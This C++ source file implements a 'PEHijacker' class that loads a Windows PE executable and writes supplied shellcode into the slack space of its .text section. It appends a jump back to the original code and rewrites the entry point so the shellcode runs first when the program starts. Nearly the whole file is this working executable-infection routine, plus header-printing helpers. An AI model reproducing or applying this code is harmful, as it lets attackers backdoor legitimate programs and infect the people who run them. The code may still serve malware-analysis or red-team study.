#include "hijacker.h"

PEHijacker::PEHijacker() { }

int PEHijacker::loadPE(char * pePath) {
	std::ifstream peStream;

	peStream.open(pePath, std::ios::binary);

	if (!peStream.is_open()) {
		return -1;
	}

	peStream.seekg(0, std::ios::end);
	peSize = peStream.tellg();
	peStream.seekg(0, std::ios::beg);

	this->peBuffer = new unsigned char[this->peSize];
	peStream.read((char*)this->peBuffer, this->peSize);

	this->peDosHeader = (PIMAGE_DOS_HEADER)this->peBuffer;
	this->peNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)peDosHeader + peDosHeader->e_lfanew);
	this->peFileHeader = (PIMAGE_FILE_HEADER)&peNtHeaders->FileHeader;
	this->peOptHeader = (PIMAGE_OPTIONAL_HEADER)&peNtHeaders->OptionalHeader;
	this->peSecHeaders = new PIMAGE_SECTION_HEADER[peFileHeader->NumberOfSections];
	for (int i = 0; i < peFileHeader->NumberOfSections; i++)
		peSecHeaders[i] = (PIMAGE_SECTION_HEADER)((BYTE*)peNtHeaders + sizeof(IMAGE_NT_HEADERS) + (i) * sizeof(IMAGE_SECTION_HEADER));

	return ERROR_SUCCESS;
}

int PEHijacker::savePE(char * pePath) {
	std::ofstream peStream;
	peStream.open(pePath, std::ios::binary);
	peStream.write((char*)this->peBuffer, this->peSize);
	peStream.close();
	return ERROR_SUCCESS;
}

void PEHijacker::hijack() {
	PIMAGE_SECTION_HEADER textSection = this->getSectionHeader((char*)".text");
	DWORD startOfPadding = this->getStartOfPadding(textSection);

	for (int i = 0; i < this->shellcodeLength; i++)
		this->peBuffer[startOfPadding + i] = this->shellcode[i];

	DWORD newEntryAddress = textSection->VirtualAddress + textSection->Misc.VirtualSize;
	
	int jumpDistance = newEntryAddress - this->getEntryAddress() + this->shellcodeLength + 4;
	jumpDistance = -jumpDistance;
	
	this->peBuffer[startOfPadding + this->shellcodeLength - 1] = this->INST_X86_JMP_NEAR_REL;
	for (int i = 0; i < sizeof(jumpDistance); i++)
		this->peBuffer[startOfPadding + this->shellcodeLength + i] = *((unsigned char *)&jumpDistance + i);

	this->setEntryAddress(newEntryAddress);
}

// ============================================================================= //
//  Helper Functions
// ============================================================================= //

void PEHijacker::setEntryAddress(DWORD address) {
	DWORD entryAddressFileOffset = this->peDosHeader->e_lfanew + sizeof(DWORD) + sizeof(_IMAGE_FILE_HEADER) + offsetof(_IMAGE_OPTIONAL_HEADER, AddressOfEntryPoint);
	for (int i = 0; i < sizeof(address); i++)
		this->peBuffer[entryAddressFileOffset + i] = *((unsigned char *)&address + i);
}

PIMAGE_SECTION_HEADER PEHijacker::getSectionHeader(char * sectionName) {
	for (int i = 0; i < this->peFileHeader->NumberOfSections; i++)
		if (strcmp(sectionName, (char*)this->peSecHeaders[i]->Name) == 0)
			return this->peSecHeaders[i];
	return NULL;
}

DWORD PEHijacker::getEntryAddress() {
	return this->peOptHeader->AddressOfEntryPoint;
}

DWORD PEHijacker::getStartOfPadding(PIMAGE_SECTION_HEADER sectionHeader) {
	return (sectionHeader->PointerToRawData + sectionHeader->Misc.VirtualSize);
}

DWORD PEHijacker::getDataSize(PIMAGE_SECTION_HEADER sectionHeader) {
	return (sectionHeader->SizeOfRawData - (sectionHeader->SizeOfRawData - sectionHeader->Misc.VirtualSize));
}

DWORD PEHijacker::getPaddingSize(PIMAGE_SECTION_HEADER sectionHeader) {
	return (sectionHeader->SizeOfRawData - sectionHeader->Misc.VirtualSize);
}

void PEHijacker::setShellcode(unsigned char * shellcode, int length) {
	this->shellcode = shellcode;
	this->shellcodeLength = length;
}

// ============================================================================= //
//  Printing Output
// ============================================================================= //

void PEHijacker::printFileHeader() {
	printf("---------------------------\n");
	printf(" File Header\n");
	printf("---------------------------\n");
	printf("  Number of Sections: %d\n", (int)this->peFileHeader->NumberOfSections);
	printf("  Number of Symbols: %d\n", (int)this->peFileHeader->NumberOfSymbols);
	printf("  Timestamp: %d\n", (int)this->peFileHeader->TimeDateStamp);
	printf("\n");
}

void PEHijacker::printOptionalHeader() {
	printf("---------------------------\n");
	printf(" Optional Header\n");
	printf("---------------------------\n");
	printf("  Entry Point: 0x%08x\n", peOptHeader->AddressOfEntryPoint);
	printf("\n");
}

void PEHijacker::printSectionHeader(PIMAGE_SECTION_HEADER sectionHeader) {
	DWORD startOfPadding = this->getStartOfPadding(sectionHeader);
	DWORD paddingSize = this->getPaddingSize(sectionHeader);
	printf("---------------------------\n");
	printf(" Section: %s\n", sectionHeader->Name);
	printf("---------------------------\n");
	printf("  Relative Virtual Address: %d bytes (0x%08x)\n", sectionHeader->VirtualAddress, sectionHeader->VirtualAddress);
	printf("  Start of Raw Data on Disk: %d bytes (0x%08x)\n", sectionHeader->PointerToRawData, sectionHeader->PointerToRawData);
	printf("  Size of Raw Data on Disk: %d bytes (0x%08x)\n", sectionHeader->SizeOfRawData, sectionHeader->SizeOfRawData);
	printf("  Virtual Size: %d bytes (0x%08x)\n", sectionHeader->Misc.VirtualSize, sectionHeader->Misc.VirtualSize);
	printf("  Start of Padding: %d bytes (0x%08x)\n", startOfPadding, startOfPadding);
	printf("  Padding Size: %d bytes (0x%08x)\n", paddingSize, paddingSize);
	printf("\n");
}

// printf("%d (0x%08x) - %d (0x%08x) + %d (0x%08x) = %d (0x%08x)\n", newEntryAddress, newEntryAddress, this->getEntryAddress(), this->getEntryAddress(), this->shellcodeLength, this->shellcodeLength, jumpDistance, jumpDistance);
